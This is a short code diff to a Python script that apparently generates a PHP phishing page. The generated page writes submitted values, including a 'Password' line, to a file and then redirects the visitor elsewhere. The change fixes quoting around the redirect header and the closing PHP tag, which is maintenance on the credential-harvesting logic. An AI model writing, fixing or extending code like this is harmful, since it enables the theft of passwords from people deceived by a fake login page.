@@ -72,10 +72,9 @@ def link():
     $us = "Password: $user\n";
     fwrite($fileuser, "\n". $co. $us. $cl);
     fclose($fileuser);
-    header('Location: {'''+y+'''}');
+    header('Location: '''+y+'''');
     exit();
-    ?>
-    ''')
+    ?>''')
 
     escribir.write(r)
     if y==1:
